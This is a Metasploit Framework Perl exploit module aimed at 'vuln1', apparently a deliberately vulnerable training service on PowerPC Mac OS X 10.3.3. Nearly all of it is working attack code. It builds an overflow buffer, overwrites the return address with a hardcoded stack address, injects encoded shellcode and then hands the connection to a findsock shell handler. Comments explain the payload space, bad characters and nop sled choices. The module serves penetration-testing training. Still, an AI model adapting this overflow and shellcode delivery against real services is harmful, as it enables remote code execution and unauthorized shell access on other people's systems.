
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::vuln1_osx;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = { };

my $info = {
  'Name'    => 'Vuln1 MacOS X Exploit',
  'Version'  => '$Revision$',
  'Authors' => [ 'spoonm', 'hdm' ],
  'Arch'    => [ 'ppc' ],
  'OS'      => [ 'osx'],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
# Default to port to 11221, the port vuln1.c listens on
      'RPORT' => [1, 'PORT', 'The target port', 11221],
    },
  'Payload' =>
    {
# We have a space limit because of the recv 4096, but its a big one
# A bigger value would mean faster brute forcing (larger steps) but
# also run the risk of running off the end of the stack
      'Space'     => 500,
# No badchars needed, but its a nice test of the QuackQuack encoder
      'BadChars'  => "\x00",
# This means if we had a payload of 490 bytes in length it would
# fail since there isn't room for 16 bytes of nop.
      'MinNops'   => 16, # This keeps brute forcing sane
    },
  'Description'  => Pex::Text::Freeform(qq{
      With new Findsock Action
    }),
  'Refs'  =>
    [
      'http://www.metasploit.com',
    ],
# Setting this to -1 means that we won't pick a default target.
# This is good if it is a 1 hit exploit, or if the target isn't
# brute force, etc.
  'DefaultTarget' => -1,
  'Targets' =>
    [
# Fudge the number gotten from gdb a bit to hit some nops and fall in
      ['MacOS X 10.3.3', 0xbffffcd0],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $srcPort     = $self->GetVar('CPORT'); # Get src port from env
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;
  my $target = $self->Targets->[$targetIndex];
  my $ret = $target->[1];

  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr'  => $targetHost,
    'PeerPort'  => $targetPort,
    'LocalPort' => $srcPort, # again, src port
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  $self->PrintLine('Trying ' . $target->[0] . ' - ' . sprintf('0x%08x', $ret));

  my $evil = "\x60" x 1024;
  substr($evil, 136, 4, pack('N', $ret));
  substr($evil, 140, length($shellcode), $shellcode); 
  $sock->Send($evil);

# The Handler routine has to be called for findsock supporting exploits.
# It will check the socket passed it, and see if there is a findsock
# shell on the line.
  $self->Handler($sock);

  return;
}

1;
